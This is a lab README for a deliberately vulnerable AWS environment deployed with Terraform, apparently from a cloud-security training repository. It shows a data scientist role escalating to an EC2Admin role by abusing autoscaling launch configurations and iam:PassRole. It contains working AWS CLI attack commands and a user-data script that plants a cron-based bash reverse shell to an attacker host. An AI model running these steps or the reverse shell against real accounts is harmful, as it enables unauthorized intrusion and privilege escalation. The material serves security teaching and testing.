# Demo 2

## Introduction

This third dataset is intended to demonstrate a AWS initial access and privilege escalation abusing default AWS policies.

The provided Terraform code will create and setup an vulnerable IAM environment; the starting point is performed using sts:AssumeRole on the _Ultima-DataScientisttaScientist_ role.

## Scenario

You are a data scientist in _Ultima_ company but you always got an interest in cyber security; you know that from the previouses incident, _Ultima_, hardened it's processes and permissions and the migration to AWS is almost completed now. That's why _Ultima_ is starting to relay of DevOps knowledge on data teams allowing them to manage their resources. To also increase security CSP policies have been applied to also prevent privilege escalations abusing overly permissive policies.

Your data scientist role has the following AWS managed policies attached:

- `DataScientist` - `arn:aws:iam::aws:policy/job-function/DataScientist`
- `AmazonElasticMapReduceFullAccess` - `arn:aws:iam::aws:policy/AmazonElasticMapReduceFullAccess`

The security team reviewed the policies and notices that `AmazonElasticMapReduceFullAccess` grants the `iam:PassRole` on all resources; in combination with `cloudformation:CreateStack`, `ec2:RunInstances`, `lambda:Create*`, `lambda:Update*` this may leads to privilege escalations. To avoid this the security team also created an inline policy to block the previous permissions.

## Walkthrough

### Deployment

- Clone the repository and `cd` inside this folder
- `terraform init` to set up the required providers and environment
- `aws sts get-caller-identity` to confirm you are using the correct AWS profile
- `terraform apply` and then `yes` to approve the changes
  - use `terraform apply -auto-approved` if you live dangerously
- wait for the deployment (~2/3 mins) and then you can assume the `Ultima-DataScientist` role

### Exploitation

With access to the `Ultima-DataScientisttaScientist` role lists all attached policies:

- `AmazonElasticMapReduceFullAccess` v7

```json
{
  "Statement": [
    {
      "Action": [
        "cloudwatch:*",
        "cloudformation:CreateStack",
        "cloudformation:DescribeStackEvents",
        "ec2:AuthorizeSecurityGroupIngress",
        "ec2:AuthorizeSecurityGroupEgress",
        "ec2:CancelSpotInstanceRequests",
        "ec2:CreateRoute",
        "ec2:CreateSecurityGroup",
        "ec2:CreateTags",
        "ec2:DeleteRoute",
        "ec2:DeleteTags",
        "ec2:DeleteSecurityGroup",
        "ec2:DescribeAvailabilityZones",
        "ec2:DescribeAccountAttributes",
        "ec2:DescribeInstances",
        "ec2:DescribeKeyPairs",
        "ec2:DescribeRouteTables",
        "ec2:DescribeSecurityGroups",
        "ec2:DescribeSpotInstanceRequests",
        "ec2:DescribeSpotPriceHistory",
        "ec2:DescribeSubnets",
        "ec2:DescribeVpcAttribute",
        "ec2:DescribeVpcs",
        "ec2:DescribeRouteTables",
        "ec2:DescribeNetworkAcls",
        "ec2:CreateVpcEndpoint",
        "ec2:ModifyImageAttribute",
        "ec2:ModifyInstanceAttribute",
        "ec2:RequestSpotInstances",
        "ec2:RevokeSecurityGroupEgress",
        "ec2:RunInstances",
        "ec2:TerminateInstances",
        "elasticmapreduce:*",
        "iam:GetPolicy",
        "iam:GetPolicyVersion",
        "iam:ListRoles",
        "iam:PassRole",
        "kms:List*",
        "s3:*",
        "sdb:*"
      ],
      "Effect": "Allow",
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": "iam:CreateServiceLinkedRole",
      "Resource": "*",
      "Condition": {
        "StringLike": {
          "iam:AWSServiceName": [
            "elasticmapreduce.amazonaws.com",
            "elasticmapreduce.amazonaws.com.cn"
          ]
        }
      }
    }
  ]
}
```

- `DataScientist` v5

```json
{
  "Statement": [
    {
      "Action": [
        "autoscaling:*",
        "cloudwatch:*",
        "cloudformation:CreateStack",
        "cloudformation:DescribeStackEvents",
        "datapipeline:Describe*",
        "datapipeline:ListPipelines",
        "datapipeline:GetPipelineDefinition",
        "datapipeline:QueryObjects",
        "dynamodb:*",
        "ec2:CancelSpotInstanceRequests",
        "ec2:CancelSpotFleetRequests",
        "ec2:CreateTags",
        "ec2:DeleteTags",
        "ec2:Describe*",
        "ec2:ModifyImageAttribute",
        "ec2:ModifyInstanceAttribute",
        "ec2:ModifySpotFleetRequest",
        "ec2:RequestSpotInstances",
        "ec2:RequestSpotFleet",
        "elasticfilesystem:*",
        "elasticmapreduce:*",
        "es:*",
        "firehose:*",
        "fsx:DescribeFileSystems",
        "iam:GetInstanceProfile",
        "iam:GetRole",
        "iam:GetPolicy",
        "iam:GetPolicyVersion",
        "iam:ListRoles",
        "kinesis:*",
        "kms:List*",
        "lambda:Create*",
        "lambda:Delete*",
        "lambda:Get*",
        "lambda:InvokeFunction",
        "lambda:PublishVersion",
        "lambda:Update*",
        "lambda:List*",
        "machinelearning:*",
        "sdb:*",
        "rds:*",
        "sns:ListSubscriptions",
        "sns:ListTopics",
        "logs:DescribeLogStreams",
        "logs:GetLogEvents",
        "redshift:*",
        "s3:CreateBucket",
        "sns:CreateTopic",
        "sns:Get*",
        "sns:List*"
      ],
      "Effect": "Allow",
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "s3:Abort*",
        "s3:DeleteObject",
        "s3:Get*",
        "s3:List*",
        "s3:PutAccelerateConfiguration",
        "s3:PutBucketCors",
        "s3:PutBucketLogging",
        "s3:PutBucketNotification",
        "s3:PutBucketTagging",
        "s3:PutObject",
        "s3:Replicate*",
        "s3:RestoreObject"
      ],
      "Resource": ["*"]
    },
    {
      "Effect": "Allow",
      "Action": ["ec2:RunInstances", "ec2:TerminateInstances"],
      "Resource": ["*"]
    },
    {
      "Effect": "Allow",
      "Action": ["iam:PassRole"],
      "Resource": [
        "arn:aws:iam::*:role/DataPipelineDefaultRole",
        "arn:aws:iam::*:role/DataPipelineDefaultResourceRole",
        "arn:aws:iam::*:role/EMR_EC2_DefaultRole",
        "arn:aws:iam::*:role/EMR_DefaultRole",
        "arn:aws:iam::*:role/kinesis-*"
      ]
    },
    {
      "Effect": "Allow",
      "Action": ["iam:PassRole"],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "iam:PassedToService": "sagemaker.amazonaws.com"
        }
      }
    },
    {
      "Effect": "Allow",
      "Action": ["sagemaker:*"],
      "NotResource": [
        "arn:aws:sagemaker:*:*:domain/*",
        "arn:aws:sagemaker:*:*:user-profile/*",
        "arn:aws:sagemaker:*:*:app/*",
        "arn:aws:sagemaker:*:*:flow-definition/*"
      ]
    },
    {
      "Effect": "Allow",
      "Action": [
        "sagemaker:CreatePresignedDomainUrl",
        "sagemaker:DescribeDomain",
        "sagemaker:ListDomains",
        "sagemaker:DescribeUserProfile",
        "sagemaker:ListUserProfiles",
        "sagemaker:*App",
        "sagemaker:ListApps"
      ],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": ["sagemaker:*FlowDefinition", "sagemaker:*FlowDefinitions"],
      "Resource": "*",
      "Condition": {
        "StringEqualsIfExists": {
          "sagemaker:WorkteamType": ["private-crowd", "vendor-crowd"]
        }
      }
    }
  ]
}
```

The interesting parts here are:

- `AmazonElasticMapReduceFullAccess`
  - `cloudformation:CreateStack`
  - `ec2:RunInstances`
  - `iam:ListRoles`
  - `iam:PassRole`
    - on all resources
- `DataScientist`
  - `cloudformation:CreateStack`
  - `lambda:Create*`
  - `lambda:Update*`
  - `ec2:RunInstances`
    - on all resources
  - `iam:PassRole`
    - only on limited roles and services

Since the security team is aware of these permissions and possible privescs, created an inline policies to deny some of the Shadow Admin Actions:

```json
{
  "Statement": [
    {
      "Action": [
        "cloudformation:CreateStack",
        "cloudformation:UpdateStack",
        "ec2:RunInstances",
        "lambda:Create*",
        "lambda:Update*"
      ],
      "Effect": "Deny",
      "Resource": "*"
    },
    {
      "Action": ["iam:Get*"],
      "Effect": "Allow",
      "Resource": "*"
    }
  ]
}
```

This policy is actually blocking the known privesc discovered in the previous demos.

Since you should always be suspicious of `*` permissions the focus is again on the attached policies.

For example the `autoscaling:*` permission allow the DataScientist to create an EC2 launch configuration and autoscaling group.

The Amazon EC2 Auto Scaling service helps organizations scale EC2 instances to maintain application availability and allows them to automatically start or terminate instances according to defined workload rules.
The service requires a launch configuration and an autoscaling group:

- the launch configuration creates a template used by the EC2 instances when running;
- the autoscaling group is used to define the scaling configuration and rules.

The attacker can then create an EC2 launch configuration and an autoscaling group with an AMI image which the attacker has access to.
A launch configuration is a template that an EC2 Auto Scaling group uses to launch EC2 instances. When a launch configuration is created, information for the instances such as the ID of the Amazon Machine Image (AMI), the instance type, a key pair, one or more security groups, and a block device mapping are specified.

Abusing also the `iam:ListRoles` permissions the attacker can easily find an admin role with EC2 access like `EC2Admin`.

To find the latest Amazon AMI:

```bash
aws ec2 describe-images --owners amazon --filters 'Name=name,Values=amzn-ami-hvm-*-x86_64-gp2' 'Name=state,Values=available' | jq -r '.Images | sort_by(.CreationDate) | last(.[]).ImageId'
```

```bash
aws autoscaling create-launch-configuration --launch-configuration-name demo2-LC --image-id ami-0f90b6b11936e1083 --instance-type t1.micro --iam-instance-profile demo2-EC2Admin --associate-public-ip-address --user-data=file://reverse-shell.sh
```

Where in `reverse-shell.sh` there is:

```bash
#!/bin/bash

sudo crontab -l > /tmp/new_cron
echo "* * * * * bash -i >& /dev/tcp/atk.demo2.xyz/443 0>&1" >> /tmp/new_cron
sudo crontab /tmp/new_cron
sudo rm /tmp/new_cron
```

_N.B._: Before creating the launch configuration: `chmod +x ./reverse-shell.sh`

The script just executes a reverse shell using bash, allowing the attacker to access the EC2 instance once started. Generally any kind of reverse shell can be used since the attacker can forge the script; a more complex one can involve obfuscation, more stable connections, download of complex beacons, persistence and malware.
The AMI image used by the attacker must be accessible from the attacker itself and there are some choices:

- an AMI with SSH access using username and password (or a keypair known to the attacker) with attached a public IP address and security groups that allow SSH traffic
- a custom public AMI that on start executes a script/routine to connect to an external machine (i.e. reverse shell)
- an AMI that on start executes a script/routine to connect to an external machine (i.e. reverse shell) using the user-data configuration
- an AMI with vulnerable services exposed using the configured security groups of the AWS account that the attacker can exploit

Now the launch configuration is created; the service needs also an autoscaling policy to start/stop the instances.

The attacker then creates the autoscaling group using the launch configuration "evilLC" to actually start EC2 instances:

```bash
aws autoscaling create-auto-scaling-group --auto-scaling-group-name demo2-ASG --launch-configuration-name demo2-LC --min-size 1 --max-size 1 --vpc-zone-identifier "subnet-aaaabbb"
```

The VPC subnets selected should at least allow the egress traffic from the EC2 to the attacker IP and port; normally egress security groups are pretty wide and the attacker is spoilt for choice.

Using the `ec2:DescribeSubnets` permissions defined in `AmazonElasticMapReduceFullAccess` the attacker can select the appropriate subnet ID.

Once the EC2 is started the attacker receive the reverse shell with access to all account:

```bash
aws sts get-caller-identity

{
  "Account": "111111111111",
  "UserId": "AROAWFKZ7XCLH3Y24XL2P:i-076ac821ccfb80c2e",
  "Arn": "arn:aws:sts::111111111111:assumed-role/EC2Admin/i-076ac821ccfb80c2e"
}
```
